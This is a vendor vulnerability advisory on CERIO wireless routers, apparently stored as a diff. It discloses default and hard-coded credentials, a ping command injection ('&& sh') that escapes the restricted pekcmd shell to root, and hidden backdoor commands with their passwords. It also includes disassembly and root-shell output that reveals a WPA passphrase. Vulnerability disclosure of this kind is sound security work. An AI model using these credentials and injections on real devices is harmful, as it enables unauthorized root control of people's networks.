@@ -1,0 +1,530 @@
+CERIO 11nbg 2.4Ghz High Power Wireless Router (pekcmd) Rootshell Backdoors
+
+
+Vendor: CERIO Corporation
+Product web page: http://www.cerio.com.tw
+Affected version: DT-100G-N (fw: Cen-WR-G2H5 v1.0.6)
+                  DT-300N (fw: Cen-CPE-N2H10A v1.0.14)
+                  DT-300N (fw: Cen-CPE-N2H10A v1.1.6)
+                  CW-300N (fw: Cen-CPE-N2H10A v1.0.22)
+                  Kozumi? (fw: Cen-CPE-N5H5R v1.1.1)
+
+
+Summary: CERIO's DT-300N A4 eXtreme Power 11n 2.4Ghz 2x2
+High Power Wireless Access Point with built-in 10dBi
+patch antennas and also supports broadband wireless
+routing. DT-300N A4's wireless High Power design
+enhances the range and stability of the device's
+wireless signal in office and home environments.
+Another key hardware function of DT-300N A4 is its PoE
+Bridging feature, which allows subsequent devices to
+be powered through DT-300N A4's LAN port. This
+reduces device cabling and allows for more convenient
+deployment. DT-300N A4 utilizes a 533Mhz high power CPU base
+with 11n 2x2 transmission rates of 300Mbps. This
+powerful device can produce high level performance
+across multiple rooms or large spaces such as offices,
+schools, businesses and residential areas. DT-300N A4
+is suitable for both indoor and outdoor deployment,
+and utilizes an IPX6 weatherproof housing.
+The DT-300N A4 hardware equipped with to bundles
+Cerio CenOS 5.0 Software Core. CenOS 5.0 devices can
+use integrated management functions of Control
+Access Point (CAP Mode) to manage an AP network.
+
+Desc: Cerio Wireless Access Point and Router suffers from
+several vulnerabilities including: hard-coded and default
+credentials, information disclosure, command injection and
+hidden backdoors that allows escaping the restricted shell
+into a root shell via the 'pekcmd' binary. Given that all
+the processes run as root, an attacker can easily drop into
+the root shell with supplying hard-coded strings stored in
+.rodata segment assigned as static constant variables. The
+pekcmd shell has several hidden functionalities for enabling
+an advanced menu and modifying MAC settings as well as easily
+escapable regex function for shell characters.
+
+Tested on: Cenwell Linux 802.11bgn MIMO Wireless AP(AR9341)
+           RALINK(R) Cen-CPE-N5H2 (Access Point)
+           CenOS 5.0/4.0/3.0
+           Hydra/0.1.8
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5409
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5409.php
+
+
+16.05.2017
+
+---
+
+
+Large number of devices uses the cenwell firmware (mips arch)
+which comes with few surprises.
+
+Default credentials (web interface):
+------------------------------------
+operator:1234
+admin:admin
+root:default
+
+
+Default credentials (linux shell, ssh or telnet):
+-------------------------------------------------
+root:default
+ate:default
+
+
+Contents of /etc/passwd (DES):
+------------------------------
+root:deGewFOVmIs8E:0:0:root:/:/bin/pekcmd <---
+
+
+The /bin/pekcmd binary is a restricted shell environment with
+limited and customized set of commands that you can use for
+administering the device once you've logged-in with the root:default
+credentials.
+
+➜  ~ telnet 10.0.0.17
+Trying 10.0.0.17...
+Connected to 10.0.0.17.
+Escape character is '^]'.
+Login: root
+Password: *******
+command>
+command> help
+
+Avaliable commands:
+    info            Show system informations
+    ping            Ping!
+    clear           clear screen
+    default         Set default and reboot
+    passwd          Change root password
+    reboot          Reboot
+    ifconfig        IP Configuration
+    iwconfig        Configure a WLAN interface
+    iwpriv          Configure private parameters of a WLAN interface
+    exit            Exit
+    help            show this help
+
+command> id
+id: no such command
+command>
+
+
+Analyzing the pekcmd binary revealed the hidden backdoors and the
+hidden advanced menu. Here is the invalid characters check function:
+
+-------------------------------------------------------------------------
+
+.text:00401F60 check_shellchars:
+.text:00401F60                 li      $gp, 0x1FB00
+.text:00401F68                 addu    $gp, $t9
+.text:00401F6C                 addiu   $sp, -0x38
+.text:00401F70                 sw      $ra, 0x38+var_4($sp)
+.text:00401F74                 sw      $s2, 0x38+var_8($sp)
+.text:00401F78                 sw      $s1, 0x38+var_C($sp)
+.text:00401F7C                 sw      $s0, 0x38+var_10($sp)
+.text:00401F80                 sw      $gp, 0x38+var_28($sp)
+.text:00401F84                 la      $a1, 0x410000
+.text:00401F88                 la      $t9, memcpy
+.text:00401F8C                 addiu   $s0, $sp, 0x38+var_20
+.text:00401F90                 move    $s2, $a0
+.text:00401F94                 addiu   $a1, (asc_409800 - 0x410000)  # ";><|$~*{}()"
+.text:00401F98                 move    $a0, $s0         # dest
+.text:00401F9C                 jalr    $t9 ; memcpy
+.text:00401FA0                 li      $a2, 0xB         # n
+.text:00401FA4                 lw      $gp, 0x38+var_28($sp)
+.text:00401FA8                 b       loc_401FE4
+.text:00401FAC                 addiu   $s1, $sp, 0x38+var_15
+
+.text:00401FB0                 lb      $a1, 0($s0)      # c
+.text:00401FB4                 jalr    $t9 ; strchr
+.text:00401FB8                 addiu   $s0, 1
+.text:00401FBC                 lw      $gp, 0x38+var_28($sp)
+.text:00401FC0                 beqz    $v0, loc_401FE4
+.text:00401FC4                 move    $a1, $v0
+.text:00401FC8                 la      $a0, 0x410000
+.text:00401FCC                 la      $t9, printf
+.text:00401FD0                 nop
+.text:00401FD4                 jalr    $t9 ; printf
+.text:00401FD8                 addiu   $a0, (aIllegalArgumen - 0x410000)  # "illegal argument: %s\n"
+.text:00401FDC                 b       loc_402000
+.text:00401FE0                 nop
+
+.text:00401FE4                 la      $t9, strchr
+.text:00401FE8                 bne     $s0, $s1, loc_401FB0
+.text:00401FEC                 move    $a0, $s2         # command
+.text:00401FF0                 la      $t9, system
+.text:00401FF4                 nop
+.text:00401FF8                 jalr    $t9 ; system
+.text:00401FFC                 nop
+
+.text:00402000                 lw      $ra, 0x38+var_4($sp)
+.text:00402004                 lw      $gp, 0x38+var_28($sp)
+.text:00402008                 move    $v0, $zero
+.text:0040200C                 lw      $s2, 0x38+var_8($sp)
+.text:00402010                 lw      $s1, 0x38+var_C($sp)
+.text:00402014                 lw      $s0, 0x38+var_10($sp)
+.text:00402018                 jr      $ra
+.text:0040201C                 addiu   $sp, 0x38
+.text:0040201C  # End of function check_shellchars
+
+-------------------------------------------------------------------------
+
+command> ping 127.0.0.1 -c 1 | id
+illegal argument: | id
+command> 
+
+
+Escaping the restricted shell using Ping command injection:
+
+
+command> ping 127.0.0.1 -c1 && id
+PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.3 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.3/0.3/0.3 ms
+uid=0(root) gid=0(root)
+
+
+We can easily drop into a sh:
+
+command> ping 127.0.0.1 -c1 && sh
+PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.3 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.3/0.3/0.3 ms
+
+
+BusyBox v1.11.2 (2014-07-29 12:05:26 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+~ # id
+uid=0(root) gid=0(root)
+~ # ls
+bin      dev      etc_ro   lib      mount    pekcmd   reset    sys      tmpetc   tmpvar   var
+cfg      etc      home     mnt      pek      proc     sbin     tmp      tmphome  usr
+~ # cat /etc/passwd
+root:deGewFOVmIs8E:0:0:root:/:/bin/pekcmd
+~ # uname -a
+Linux (none) 2.6.31--LSDK-9.2.0_U9.915 #9 Mon Aug 11 09:48:52 CST 2014 mips unknown
+~ # cd etc
+/etc # cat hostapd0.conf 
+interface=ath0
+ssid={{SSID_OMITTED}}
+macaddr_acl=0
+logger_syslog=-1
+logger_syslog_level=2
+logger_stdout=-1
+logger_stdout_level=2
+dump_file=/tmp/hostapd0.dump
+ctrl_interface=/var/run/hostapd
+ctrl_interface_group=0
+rts_threshold=2346
+fragm_threshold=2346
+max_num_sta=32
+wpa_group_rekey=600
+wpa_gmk_rekey=86400
+wpa_pairwise=TKIP
+wpa=2
+wpa_passphrase=0919067031
+/etc # cat version
+Atheros/ Version 1.0.1 with AR7xxx --  三 2月 5 17:30:42 CST 2014
+/etc # cd /home/httpd/cgi-bin
+/home/httpd/cgi-bin # cat .htpasswd
+root:deGewFOVmIs8E
+/home/httpd/cgi/bin # cd /cfg
+/cfg # ls -al
+drwxr-xr-x    2 root     root            0 Jan  1 00:00 .
+drwxr-xr-x   23 1000     1000          305 Feb  5  2014 ..
+-rw-r--r--    1 root     root         7130 Jan  1 00:00 config
+-rwxrwxrwx    1 root     root          427 Jan  1 00:00 rsa_host_key
+-rwxrwxrwx    1 root     root          225 Jan  1 00:00 rsa_host_key.pub
+-rw-r--r--    1 root     root           22 Jan  1 00:00 telnet.conf
+/cfg # cat telnet.conf 
+Root_password=default
+/cfg # cat config |grep pass
+Root_password "default"
+Admin_password "admin"
+/cfg # exit
+command>
+
+
+
+
+The hidden 'art' command backdoor enabling root shell, calling system sh
+using password: 111222333:
+
+-------------------------------------------------------------------------
+
+la      $a0, 0x410000
+la      $t9, strcmp
+addiu   $a1, $sp, 0xB8+var_A0  # s2
+jalr    $t9 ; strcmp
+addiu   $a0, (a111222333 - 0x410000)  # "111222333"
+lw      $gp, 0xB8+var_A8($sp)
+sltu    $s0, $zero, $v0
+
+
+.text:004035D8 loc_4035D8:
+.text:004035D8                 la      $a1, 0x410000
+.text:004035DC                 la      $t9, strcpy
+.text:004035E0                 addiu   $s0, $sp, 0xB8+var_8C
+.text:004035E4                 addiu   $a1, (aArt - 0x410000)  # "ART"
+.text:004035E8                 move    $a0, $s0         # dest
+.text:004035EC                 sw      $zero, 0xB8+var_8C($sp)
+.text:004035F0                 sw      $zero, 4($s0)
+.text:004035F4                 sw      $zero, 8($s0)
+.text:004035F8                 sw      $zero, 0xC($s0)
+.text:004035FC                 jalr    $t9 ; strcpy
+.text:00403600                 sw      $zero, 0x10($s0)
+.text:00403604                 lw      $gp, 0xB8+var_A8($sp)
+.text:00403608                 nop
+.text:0040360C                 la      $t9, strlen
+.text:00403610                 nop
+.text:00403614                 jalr    $t9 ; strlen
+.text:00403618                 move    $a0, $s0         # s
+.text:0040361C                 lw      $gp, 0xB8+var_A8($sp)
+.text:00403620                 move    $a3, $zero       # flags
+.text:00403624                 addiu   $a2, $v0, 1      # n
+.text:00403628                 la      $t9, send
+.text:0040362C                 move    $a0, $s1         # fd
+.text:00403630                 jalr    $t9 ; send
+.text:00403634                 move    $a1, $s0         # buf
+.text:00403638                 lw      $gp, 0xB8+var_A8($sp)
+.text:0040363C                 move    $a1, $s0         # buf
+.text:00403640                 li      $a2, 0x14        # nbytes
+.text:00403644                 la      $t9, read
+.text:00403648                 nop
+.text:0040364C                 jalr    $t9 ; read
+.text:00403650                 move    $a0, $s1         # fd
+.text:00403654                 lw      $gp, 0xB8+var_A8($sp)
+.text:00403658                 nop
+.text:0040365C                 la      $t9, close
+.text:00403660                 nop
+.text:00403664                 jalr    $t9 ; close
+.text:00403668                 move    $a0, $s1         # fd
+.text:0040366C                 lw      $gp, 0xB8+var_A8($sp)
+.text:00403670                 nop
+.text:00403674                 la      $a0, 0x410000
+.text:00403678                 la      $t9, puts
+.text:0040367C                 nop
+.text:00403680                 jalr    $t9 ; puts
+.text:00403684                 addiu   $a0, (aEnterArtMode - 0x410000)  # "\n\n===>Enter ART Mode"
+.text:00403688                 lw      $gp, 0xB8+var_A8($sp)
+.text:0040368C                 nop
+.text:00403690                 la      $v0, stdout
+.text:00403694                 la      $t9, fflush
+.text:00403698                 lw      $a0, (stdout - 0x41A000)($v0)  # stream
+.text:0040369C                 jalr    $t9 ; fflush
+.text:004036A0                 nop
+.text:004036A4                 lw      $gp, 0xB8+var_A8($sp)
+.text:004036A8                 nop
+.text:004036AC                 la      $a0, 0x410000
+.text:004036B0                 la      $t9, system
+.text:004036B4                 addiu   $a0, (aSh - 0x410000)  # "sh"
+
+-------------------------------------------------------------------------
+
+command> art
+Enter password
+
+
+===>Enter ART Mode
+
+
+BusyBox v1.11.2 (2014-07-28 12:48:51 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+~ # id
+uid=0(root) gid=0(root)
+
+
+The hidden 'pekpekengeng' backdoor enabling advanced commands
+and access to root shell:
+
+-------------------------------------------------------------------------
+
+la      $v0, 0x420000
+nop
+lw      $s0, (off_419A48 - 0x420000)($v0) # off_419A48 = "pekpekengeng"
+jalr    $t9 ; strlen
+move    $a0, $s0         # s
+lw      $gp, 0x38+var_28($sp)
+bne     $s3, $v0, loc_403350
+move    $a0, $s5         # s1
+
+la      $t9, strncmp
+move    $a1, $s0         # s2
+jalr    $t9 ; strncmp
+move    $a2, $s3         # n
+lw      $gp, 0x38+var_28($sp)
+bnez    $v0, loc_403350
+li      $v1, 1
+
+loc_4033A8:
+la      $t9, printf
+addiu   $a0, $s1, (aSNoSuchCommand - 0x410000)  # "%s: no such command\n"
+jalr    $t9 ; printf
+move    $a1, $s4
+
+la      $a0, 0x410000
+la      $t9, puts
+nop
+jalr    $t9 ; puts
+addiu   $a0, (aAdvancedComman - 0x410000)  # "\nAdvanced commands:"
+lw      $gp, 0x28+var_18($sp)
+nop
+la      $v0, 0x420000
+nop
+addiu   $s0, $v0, (off_4199A8 - 0x420000)
+la      $v0, 0x410000
+b       loc_4020F8
+addiu   $s1, $v0, (a16sS - 0x410000)  # "    %-16s%s\n"
+
+-------------------------------------------------------------------------
+
+command> help
+
+Avaliable commands:
+    info            Show system informations
+    ping            Ping!
+    clear           clear screen
+    default         Set default and reboot
+    passwd          Change root password
+    reboot          Reboot
+    ifconfig        IP Configuration
+    iwconfig        Configure a WLAN interface
+    iwpriv          Configure private parameters of a WLAN interface
+    exit            Exit
+    help            show this help
+
+command> sh
+sh: no such command
+command> pekpekengeng
+pekpekengeng: no such command
+command> help
+
+Avaliable commands:
+    info            Show system informations
+    ping            Ping!
+    clear           clear screen
+    default         Set default and reboot
+    passwd          Change root password
+    reboot          Reboot
+    ifconfig        IP Configuration
+    iwconfig        Configure a WLAN interface
+    iwpriv          Configure private parameters of a WLAN interface
+    exit            Exit
+    help            show this help
+
+Advanced commands:
+    ifconfig        IP Configuration
+    sh              root shell
+    quit            Quit
+
+command> sh
+
+
+BusyBox v1.11.2 (2013-02-22 10:51:58 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+~ # id
+uid=0(root) gid=0(root)
+~ # 
+
+
+
+Other hidden functionalities:
+
+
+command> unistorm
+Usage:
+unistorm device mac count [interval] [len]
+command> 
+command> unistorm 1 2 3
+target: 02:7f875b7c:2ab4a770:4007c4:2aac5010:00
+ioctl SIOCGIFINDEX: No such devicecommand> 
+
+
+Serial connection password: 123456789
+
+
+Hidden 'ate' mode:
+
+.text:00401BB0
+.text:00401BB0 loc_401BB0:                              # CODE XREF: main+284j
+.text:00401BB0                 la      $t9, lineedit_read_key
+.text:00401BB4                 nop
+.text:00401BB8                 jalr    $t9 ; lineedit_read_key
+.text:00401BBC                 move    $a0, $s0
+.text:00401BC0                 lw      $gp, 0xC8+var_B8($sp)
+.text:00401BC4                 nop
+.text:00401BC8                 la      $t9, lineedit_handle_byte
+.text:00401BCC                 nop
+.text:00401BD0                 jalr    $t9 ; lineedit_handle_byte
+.text:00401BD4                 move    $a0, $v0
+.text:00401BD8                 lw      $gp, 0xC8+var_B8($sp)
+.text:00401BDC
+.text:00401BDC loc_401BDC:                              # CODE XREF: main+244j
+.text:00401BDC                 lw      $v1, -0x634C($s1)
+.text:00401BE0                 nop
+.text:00401BE4                 slti    $v0, $v1, 3
+.text:00401BE8                 bnez    $v0, loc_401BB0
+.text:00401BEC                 li      $v0, 3
+.text:00401BF0                 beq     $v1, $v0, loc_401D48
+.text:00401BF4                 nop
+.text:00401BF8                 la      $v0, 0x420000
+.text:00401BFC                 nop
+.text:00401C00                 lw      $v1, (dword_419CB8 - 0x420000)($v0)
+.text:00401C04                 li      $v0, 1
+.text:00401C08                 bne     $v1, $v0, loc_401C98
+.text:00401C0C                 move    $a1, $zero
+.text:00401C10                 la      $a0, 0x410000
+.text:00401C14                 la      $t9, puts
+.text:00401C18                 nop
+.text:00401C1C                 jalr    $t9 ; puts
+.text:00401C20                 addiu   $a0, (aAteMode - 0x410000)  # "ate mode"
+.text:00401C24                 lw      $gp, 0xC8+var_B8($sp)
+.text:00401C28                 nop
+.text:00401C2C                 la      $v0, stdout
+.text:00401C30                 la      $t9, fflush
+.text:00401C34                 lw      $a0, (stdout - 0x41A000)($v0)  # stream
+.text:00401C38                 jalr    $t9 ; fflush
+.text:00401C3C                 nop
+.text:00401C40                 lw      $gp, 0xC8+var_B8($sp)
+.text:00401C44                 nop
+.text:00401C48                 la      $t9, lineedit_back_term
+.text:00401C4C                 nop
+.text:00401C50                 jalr    $t9 ; lineedit_back_term
+.text:00401C54                 nop
+.text:00401C58                 lw      $gp, 0xC8+var_B8($sp)
+.text:00401C5C                 nop
+.text:00401C60                 la      $a0, 0x410000
+.text:00401C64                 la      $t9, system
+.text:00401C68                 nop
+.text:00401C6C                 jalr    $t9 ; system
+.text:00401C70                 addiu   $a0, (aSh - 0x410000)  # "sh"
+.text:00401C74                 lw      $gp, 0xC8+var_B8($sp)
+.text:00401C78                 nop
+.text:00401C7C                 la      $t9, lineedit_set_term
+.text:00401C80                 nop
+.text:00401C84                 jalr    $t9 ; lineedit_set_term
+.text:00401C88                 nop
+.text:00401C8C                 lw      $gp, 0xC8+var_B8($sp)
+.text:00401C90                 b       loc_401D48
+.text:00401C94                 nop
+
+
+Web server configuration information disclosure:
+
+http://TARGET/hydra.conf
